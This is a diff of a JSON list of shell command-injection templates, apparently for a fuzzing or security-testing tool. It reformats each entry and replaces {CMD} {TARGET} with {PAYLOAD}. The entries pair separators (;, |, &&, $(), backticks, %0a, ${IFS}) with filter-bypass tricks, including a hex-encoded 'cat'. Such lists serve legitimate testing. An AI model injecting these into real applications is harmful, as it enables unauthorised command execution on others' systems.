@@ -1,56 +1,11 @@
 [
-  {
-    "id": "semi",
-    "name": ";",
-    "template": ";{CMD} {TARGET}",
-    "category": "baseline"
-  },
-  {
-    "id": "pipe",
-    "name": "|",
-    "template": "|{CMD} {TARGET}",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "or",
-    "name": "||",
-    "template": "||{CMD} {TARGET}",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "and",
-    "name": "&&",
-    "template": "&&{CMD} {TARGET}",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "dollar",
-    "name": "$()",
-    "template": "$({CMD} {TARGET})",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "backtick",
-    "name": "`",
-    "template": "`{CMD} {TARGET}`",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "newline",
-    "name": "%0a",
-    "template": "%0a{CMD} {TARGET}",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "ifs",
-    "name": "${IFS}",
-    "template": ";{CMD}${IFS}{TARGET}",
-    "category": "semantic_bypass"
-  },
-  {
-    "id": "hex_escape",
-    "name": "$'\\x'",
-    "template": ";$'\\x63\\x61\\x74' {TARGET}",
-    "category": "encoding_bypass"
-  }
+  {"id": "semi",       "name": ";",         "template": ";{PAYLOAD}",          "category": "baseline"},
+  {"id": "pipe",       "name": "|",         "template": "|{PAYLOAD}",          "category": "semantic_bypass"},
+  {"id": "or",         "name": "||",        "template": "||{PAYLOAD}",         "category": "semantic_bypass"},
+  {"id": "and",        "name": "&&",        "template": "&&{PAYLOAD}",         "category": "semantic_bypass"},
+  {"id": "dollar",     "name": "$()",       "template": "$({PAYLOAD})",        "category": "semantic_bypass"},
+  {"id": "backtick",   "name": "`",         "template": "`{PAYLOAD}`",         "category": "semantic_bypass"},
+  {"id": "newline",    "name": "%0a",       "template": "%0a{PAYLOAD}",        "category": "semantic_bypass"},
+  {"id": "ifs",        "name": "${IFS}",    "template": ";${IFS}{PAYLOAD}",    "category": "semantic_bypass"},
+  {"id": "hex_escape", "name": "$'\\x'",    "template": ";$'\\x63\\x61\\x74' {PAYLOAD}", "category": "encoding_bypass"}
 ]
